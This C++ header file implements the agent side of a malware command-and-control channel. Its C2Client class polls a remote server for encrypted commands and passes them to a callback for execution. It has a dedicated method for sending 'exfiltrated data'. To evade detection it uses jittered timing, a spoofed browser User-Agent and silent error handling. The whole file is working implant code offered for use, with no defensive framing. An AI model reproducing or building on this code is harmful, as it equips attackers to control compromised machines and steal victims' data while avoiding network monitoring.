#pragma once

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#endif

#include <string>
#include <vector>
#include <cstdint>
#include <mutex>
#include <random>
#include <chrono>
#include <thread>
#include <atomic>
#include <functional>
#include <sstream>
#include <iomanip>

#include <curl/curl.h>
#include <nlohmann/json.hpp>

#include "domain/common/EncryptedC2.hpp"
#include "domain/common/C2Protocol.hpp"

namespace nuub::infrastructure::c2 {

// HTTPS C2 Client with encrypted communication
class C2Client {
    std::string server_url_;          // C2 server base URL (https://...)
    std::string agent_id_;            // This agent's identifier
    std::string session_id_;          // Unique per-boot session ID
    domain::EncryptedChannel crypto_; // AES-256-GCM encryption
    std::mutex curl_mutex_;
    std::atomic<bool> running_{false};
    std::thread poll_thread_;

    // Callback for incoming commands
    std::function<void(const domain::C2Command&)> on_command_;
    // Callback for sending responses
    std::function<std::string(const std::string&)> on_response_;

    // Jitter: random delay between polls to avoid pattern detection
    int poll_interval_ms_ = 5000;
    int jitter_ms_ = 2000;

    // Generate random session ID
    static std::string generate_session_id() {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<uint32_t> dist(0, 0xFFFFFFFF);

        std::ostringstream oss;
        oss << std::hex << std::setfill('0');
        for (int i = 0; i < 8; ++i) {
            oss << std::setw(8) << dist(gen);
        }
        return oss.str();
    }

    // Get current timestamp in milliseconds
    static uint64_t timestamp_ms() {
        return std::chrono::duration_cast<std::chrono::milliseconds>(
            std::chrono::system_clock::now().time_since_epoch()).count();
    }

    // Base64 encode
    static std::string base64_encode(const std::vector<uint8_t>& data) {
        static const char table[] =
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        std::string result;
        result.reserve(((data.size() + 2) / 3) * 4);

        for (size_t i = 0; i < data.size(); i += 3) {
            uint32_t n = static_cast<uint32_t>(data[i]) << 16;
            if (i + 1 < data.size()) n |= static_cast<uint32_t>(data[i + 1]) << 8;
            if (i + 2 < data.size()) n |= static_cast<uint32_t>(data[i + 2]);

            result.push_back(table[(n >> 18) & 0x3F]);
            result.push_back(table[(n >> 12) & 0x3F]);
            result.push_back((i + 1 < data.size()) ? table[(n >> 6) & 0x3F] : '=');
            result.push_back((i + 2 < data.size()) ? table[n & 0x3F] : '=');
        }
        return result;
    }

    // Base64 decode
    static std::vector<uint8_t> base64_decode(const std::string& encoded) {
        static const int table[256] = {
            -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
            -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
            -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,
            52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-1,-1,-1,
            -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,
            15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,
            -1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,
            41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1,
            -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
            -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
            -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
            -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
            -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
            -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
            -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
            -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1
        };

        std::vector<uint8_t> result;
        result.reserve(encoded.size() * 3 / 4);

        uint32_t buf = 0;
        int bits = 0;
        for (char c : encoded) {
            if (c == '=' || c == '\n' || c == '\r') continue;
            int val = table[static_cast<uint8_t>(c)];
            if (val < 0) continue; // Skip invalid characters
            buf = (buf << 6) | val;
            bits += 6;
            if (bits >= 8) {
                bits -= 8;
                result.push_back(static_cast<uint8_t>((buf >> bits) & 0xFF));
            }
        }
        return result;
    }

    // Max response size: 10MB
    static constexpr size_t MAX_RESPONSE_SIZE = 10 * 1024 * 1024;

    // CURL write callback
    static size_t write_callback(char* ptr, size_t size, size_t nmemb, void* userdata) {
        auto* resp = static_cast<std::string*>(userdata);
        size_t total = size * nmemb;
        if (resp->size() + total > MAX_RESPONSE_SIZE) {
            return 0; // Abort: exceeded max size
        }
        resp->append(ptr, total);
        return total;
    }

    // Send HTTP request
    std::string http_post(const std::string& path, const std::string& body) {
        std::lock_guard lock(curl_mutex_);

        CURL* curl = curl_easy_init();
        if (!curl) return "";

        std::string response;
        std::string url = server_url_ + path;

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, body.size());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 30L);

        // HTTPS verification
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);

        // Realistic headers
        struct curl_slist* headers = nullptr;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        headers = curl_slist_append(headers, "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
        headers = curl_slist_append(headers, "Accept: application/json");
        headers = curl_slist_append(headers, "Connection: keep-alive");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        CURLcode res = curl_easy_perform(curl);

        curl_slist_free_all(headers);
        curl_easy_cleanup(curl);

        return (res == CURLE_OK) ? response : "";
    }

    // Build and sign a C2 message
    domain::C2Message build_message(domain::C2MessageType type, const std::string& payload) {
        domain::C2Message msg;
        msg.type = type;
        msg.agent_id = agent_id_;
        msg.session_id = session_id_;
        msg.timestamp = timestamp_ms();

        // Encrypt the payload
        auto plaintext = std::vector<uint8_t>(payload.begin(), payload.end());
        auto encrypted = crypto_.encrypt(plaintext);
        msg.payload = base64_encode(encrypted);

        // Compute HMAC over the encrypted payload
        auto hmac = crypto_.compute_hmac(encrypted);
        msg.hmac = base64_encode(hmac);

        return msg;
    }

    // Verify and decrypt a C2 message payload
    std::string verify_and_decrypt(const domain::C2Message& msg) {
        // Decode payload and HMAC
        auto encrypted = base64_decode(msg.payload);
        auto expected_hmac = base64_decode(msg.hmac);

        // Verify HMAC (authenticate before decrypt)
        if (!crypto_.verify_hmac(encrypted, expected_hmac)) {
            return ""; // HMAC verification failed
        }

        // Decrypt
        auto plaintext = crypto_.decrypt(encrypted);
        return std::string(plaintext.begin(), plaintext.end());
    }

    // Poll loop — checks for commands from C2 server
    void poll_loop() {
        while (running_) {
            try {
                // Build heartbeat message
                domain::C2Message heartbeat = build_message(
                    domain::C2MessageType::HEARTBEAT, "{}");

                // Send heartbeat and get pending commands
                std::string resp = http_post("/poll", heartbeat.to_json());

                if (!resp.empty()) {
                    auto response_msg = domain::C2Message::from_json(resp);

                    if (response_msg.type == domain::C2MessageType::COMMAND) {
                        // Decrypt the command
                        std::string cmd_json = verify_and_decrypt(response_msg);

                        if (!cmd_json.empty()) {
                            auto cmd = domain::C2Command::from_json(cmd_json);

                            // Execute command via callback
                            if (on_command_) {
                                on_command_(cmd);
                            }
                        }
                    }
                }
            } catch (...) {
                // Silently continue on errors
            }

            // Jittered sleep to avoid traffic patterns
            std::random_device rd;
            std::mt19937 gen(rd());
            std::uniform_int_distribution<int> dist(
                poll_interval_ms_ - jitter_ms_,
                poll_interval_ms_ + jitter_ms_);
            std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));
        }
    }

public:
    C2Client(std::string server_url, std::string agent_id, const std::string& encryption_key)
        : server_url_(std::move(server_url))
        , agent_id_(std::move(agent_id))
        , session_id_(generate_session_id())
        , crypto_(encryption_key) {}

    ~C2Client() {
        stop();
    }

    // Set command callback
    void on_command(std::function<void(const domain::C2Command&)> callback) {
        on_command_ = std::move(callback);
    }

    // Set poll interval
    void set_poll_interval(int interval_ms, int jitter_ms = 2000) {
        poll_interval_ms_ = interval_ms;
        jitter_ms_ = jitter_ms;
    }

    // Send a response back to C2 server
    bool send_response(const domain::C2Response& response) {
        domain::C2Message msg = build_message(
            domain::C2MessageType::RESPONSE,
            response.to_json());

        std::string resp = http_post("/response", msg.to_json());
        return !resp.empty();
    }

    // Send exfiltrated data
    bool send_exfil(const std::string& data_type, const std::string& data) {
        nlohmann::json j;
        j["type"] = data_type;
        j["data"] = data;

        domain::C2Message msg = build_message(
            domain::C2MessageType::EXFIL,
            j.dump());

        std::string resp = http_post("/exfil", msg.to_json());
        return !resp.empty();
    }

    // Send status update
    bool send_status(const std::string& status) {
        domain::C2Message msg = build_message(
            domain::C2MessageType::STATUS,
            "{\"status\":\"" + status + "\"}");

        std::string resp = http_post("/status", msg.to_json());
        return !resp.empty();
    }

    // Start polling for commands
    void start() {
        running_ = true;
        poll_thread_ = std::thread(&C2Client::poll_loop, this);
    }

    // Stop polling
    void stop() {
        running_ = false;
        if (poll_thread_.joinable()) {
            poll_thread_.join();
        }
    }

    // Get session info
    const std::string& session_id() const { return session_id_; }
    const std::string& agent_id() const { return agent_id_; }
    bool is_running() const { return running_; }
};

} // namespace nuub::infrastructure::c2
